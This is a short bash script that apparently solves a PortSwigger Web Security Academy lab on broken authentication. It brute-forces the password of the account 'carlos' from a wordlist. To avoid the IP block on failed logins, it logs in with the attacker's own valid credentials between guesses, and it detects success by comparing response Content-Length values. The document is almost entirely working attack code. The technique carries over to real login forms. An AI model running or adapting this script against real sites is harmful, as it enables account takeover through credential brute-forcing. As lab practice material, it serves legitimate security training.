#!/bin/bash
# for portswigger lab broken auth - breaking ip block for using wrong creds. by using right creds in between the attack
# Attacker known creds -> username=wiener password=peter
# Target creds -> username=carlos password=????
a=1
while read LINE ; do
    # using right - known creds of the attacker
    b="username=wiener&password=peter"
    echo $b
    k=$(curl -i -X POST https://0ac0008c04d430d7c0f928f100570072.web-security-academy.net/login --data $b -b 'session=PBaLRR6RqcK9LZC6wBHQuPbrc2Ztoldh' | grep "Content-Length:" | sed 's/Content-Length: //') # this will end up with having only content length number as the output..which is going to be '0' here cause right creds causing redirect.
    echo $k
    clear # just to make things look clean

    # using target username with list of passwords to bruteforce from list.txt
    c="username=carlos&password="$LINE
    echo $c
    p=$(curl -i -X POST https://0ac0008c04d430d7c0f928f100570072.web-security-academy.net/login --data $c -b 'session=PBaLRR6RqcK9LZC6wBHQuPbrc2Ztoldh' | grep "Content-Length:" | sed 's/Content-Length: //')
    #below code will compare length of response of our bruteforce with the length of response of right creds. will keep going till it gets same content length. which means we got the right password of our target
    echo $p
    if [ $p == $k ];
    then
        echo "WAITTTT"
        echo "outcome is " $c
        exit
    else
        echo "nope"
    fi
done<list.txt


